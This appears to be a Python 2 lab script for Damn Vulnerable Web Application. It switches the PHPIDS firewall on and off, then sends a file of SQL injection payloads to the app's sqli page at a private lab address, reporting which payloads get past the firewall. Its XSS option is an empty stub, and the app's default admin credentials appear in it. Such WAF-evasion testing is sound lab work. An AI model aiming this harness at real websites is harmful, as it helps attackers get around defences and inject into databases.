import urllib, urllib2, cookielib

username = 'admin'
password = 'password'

#read all payload and sort them line by line without \n
with open("/root/Desktop/payloads") as f:
	payloads = f.read().splitlines()

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener2 = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

def getFlag():
        if flag == 0:
                print "WAF: OFF"
                return;
        else:
                print "WAF: ON"
                return;


sufix = "&Submit=Submit#"
flag = 0
menu = {}
menu['0']="Set WAF"
menu['1']="SQLi"
menu['2']="XSS"
menu['3']="Exit"
while True:
  options=menu.keys()
  options.sort()

  getFlag()

  for entry in options:
	print entry, menu[entry]

  #Menu options
  selection = raw_input("Please select:")
  if selection == '0':
	if flag == 0:
		opener.open('http://192.168.57.100/index.php')
		opener2.open('http://192.168.57.100/security.php?phpids=on')
		flag = 1
	else: 
		opener.open('http://192.168.57.100/index.php')
                opener2.open('http://192.168.57.100/security.php?phpids=off')
                flag = 0

  if selection == '1':
#	cj = cookielib.CookieJar()
#	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
#        login_data = urllib.urlencode({'username' : username, 'password' : password})
#        opener.open('http://192.168.57.100/index.php')
#	opener2.open('http://192.168.57.100/security.php?phpids=on')
	# Test each payload from the file
	count = 0
	for payload in payloads:
		count += 1
		resp = opener.open('http://192.168.57.100/vulnerabilities/sqli/?id='+urllib.quote_plus(payload)+sufix) 
		print "Payload " + str(count) + ": " + payload + " passed to the web app"
		response = resp.read()
		# Check if WAF has been triggered
		if "Hacking" in response:
			print "Payload " + str(count) + ": " + payload + " did not go through"
			print "-----------------------------------"
		else: 
			print "Payload " + str(count) + ": " + payload + " succesfull"
		      	print "-----------------------------------"
#		print response
#	break
  elif selection == '2':
	print "XSS script now needs to run"
  elif selection == '3':
	break
  else:
	print ""
#print resp.read()

